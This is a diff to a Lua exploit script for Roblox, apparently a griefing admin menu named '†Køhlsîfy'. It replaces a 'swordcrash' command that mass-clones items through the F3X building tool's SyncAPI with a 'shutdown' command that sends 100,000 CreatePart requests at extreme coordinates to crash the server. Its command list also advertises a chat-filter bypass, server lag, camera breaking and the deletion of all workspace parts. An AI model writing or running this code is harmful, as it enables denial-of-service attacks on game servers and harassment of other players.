@@ -1062,126 +1062,35 @@ addcommand("slag", "Server lag (2 stones)", function()
 end)
 addcommand("serverlag", "", function(args) commands["slag"](args) end)
 
-local scrashActive = false
-
-addcommand("swordcrash", "Crash server with sword clone exploit", function()
-    scrashActive = true
-    tchat("ungear me")
-    task.wait(0.5)
-
-    local f3x = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
-    if not f3x then
+-- New shutdown command (replaces swordcrash)
+addcommand("shutdown", "Crash server with F3X mass creation", function()
+    local tool = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
+    if not tool then
         tchat("f3x")
         task.wait(2)
-        f3x = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
+        tool = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
     end
-    if not f3x then
+    if not tool then
         WindUI:Notify({Title="†Køhlsîfy", Content="You no have F3X", Duration=3})
-        scrashActive = false
         return
     end
-
-    local function findSwordTool(parent)
-        if not parent then return nil end
-        local exact = parent:FindFirstChild("DragonSword&Shield")
-        if exact and exact:IsA("Tool") then return exact end
-        for _, child in ipairs(parent:GetChildren()) do
-            if child:IsA("Tool") and child.Name:lower():find("dragon", 1, true) then
-                return child
-            end
-        end
-        return nil
-    end
-
-    local sword = findSwordTool(plr.Backpack) or findSwordTool(plr.Character)
-    if not sword then
-        tchat("give me 00000000000000000000000000000172298750")
-        task.wait(2)
-        sword = findSwordTool(plr.Backpack) or findSwordTool(plr.Character)
-    end
-    if not sword then
-        WindUI:Notify({Title="†Køhlsîfy", Content="You no have DragonSword&Shield", Duration=3})
-        scrashActive = false
-        return
-    end
-
-    if sword.Parent == plr.Backpack then
-        sword.Parent = plr.Character
-    end
-    task.wait(0.5)
-
-    sword.Parent = plr.Backpack
-    task.wait(0.5)
-
     if plr.Backpack:FindFirstChild("Building Tools") then
         plr.Backpack["Building Tools"].Parent = plr.Character
-    elseif not (plr.Character and plr.Character:FindFirstChild("Building Tools")) then
-        WindUI:Notify({Title="†Køhlsîfy", Content="F3X not found after give", Duration=3})
-        scrashActive = false
-        return
     end
-
-    local f3xTool = plr.Character:FindFirstChild("Building Tools") or plr.Backpack:FindFirstChild("Building Tools")
-    if not f3xTool then scrashActive = false return end
-
-    local playerModel = workspace:FindFirstChild(plr.Name)
-    local leftArm = playerModel and playerModel:FindFirstChild("Left Arm")
-    local shield = leftArm and leftArm:FindFirstChild("Shield")
-    if not shield then
-        WindUI:Notify({Title="†Køhlsîfy", Content="Shield not found in Left Arm", Duration=3})
-        scrashActive = false
-        return
-    end
-
+    tchat("setmessage servercrash by " .. plr.DisplayName)
+    tchat("brightness inf")
+    local api = plr.Character:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint
+    if not api then return end
+    local pos = CFrame.new(-12367938482, -999676661203, 9999999, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+    local parent = workspace:FindFirstChild(plr.Name)
     spawn(function()
-        local api = f3xTool:FindFirstChild("SyncAPI") and f3xTool.SyncAPI:FindFirstChild("ServerEndpoint")
-        if not api then
-            local bp = plr.Backpack:GetChildren()
-            for _, item in ipairs(bp) do
-                if item:FindFirstChild("SyncAPI") then
-                    api = item.SyncAPI.ServerEndpoint
-                    break
-                end
-            end
-        end
-        if api then
-            while scrashActive do
-                pcall(function()
-                    api:InvokeServer("Clone", {shield}, plr.Character)
-                end)
-                task.wait(0.01)
-            end
+        for i = 1, 100000 do
+            pcall(function()
+                api:InvokeServer("CreatePart", "Normal", pos, parent)
+            end)
         end
     end)
-
-    spawn(function()
-        local function findNilByName(name)
-            for _, obj in getnilinstances() do
-                if obj.Name == name then
-                    return obj
-                end
-            end
-            return nil
-        end
-        local nilLeftArm = findNilByName("Left Arm")
-        if nilLeftArm then
-            while scrashActive do
-                pcall(function()
-                    api:InvokeServer("Clone", {nilLeftArm}, plr.Character)
-                end)
-                task.wait(0.01)
-            end
-        end
-    end)
-
-    WindUI:Notify({Title="†Køhlsîfy", Content="Swordcrash initiated!", Duration=3})
-end)
-addcommand("scrash", "", function(args) commands["swordcrash"](args) end)
-
-addcommand("unscrash", "Stop swordcrash and reset", function()
-    scrashActive = false
-    tchat("reset me")
-    WindUI:Notify({Title="†Køhlsîfy", Content="Swordcrash stopped", Duration=2})
+    WindUI:Notify({Title="†Køhlsîfy", Content="Shutdown initiated!", Duration=3})
 end)
 
 addcommand("r15", "Switch to R15", function() tchat("!experiment adaptiver6 on") task.wait(2) tchat("unchar me") end)
@@ -1349,7 +1258,7 @@ end)
 local __commandsTab = Window:Tab({ Title = "Commands", Icon = "lucide:terminal" })
 __commandsTab:Paragraph({
     Title = "Commands 1",
-    Desc = "ban <player> [reason] - blacklist & kick\nban2 <player> [reason] - stronger ban\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - disable obby touch\nclrall/clr - delete all workspace parts\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nswordcrash/scrash - crash server (sword exploit)\nunscrash - stop crash"
+    Desc = "ban <player> [reason] - blacklist & kick\nban2 <player> [reason] - stronger ban\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - disable obby touch\nclrall/clr - delete all workspace parts\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nshutdown - crash server"
 })
 
 __commandsTab:Paragraph({
@@ -1447,7 +1356,7 @@ Players.PlayerAdded:Connect(function(p)
         WindUI:Notify({Title="†Køhlsîfy", Content="Whitelisted, " .. p.Name .. " join in server", Duration=5})
     end
     if p ~= plr then
-        if recentlyKicked[p.Name] then
+        if recentlyKicked[p.Name] and not table.find(blacklisted, p.Name) then
             local dialog = Instance.new("ScreenGui")
             dialog.Name = "ReturnDialog"
             dialog.Parent = game.CoreGui
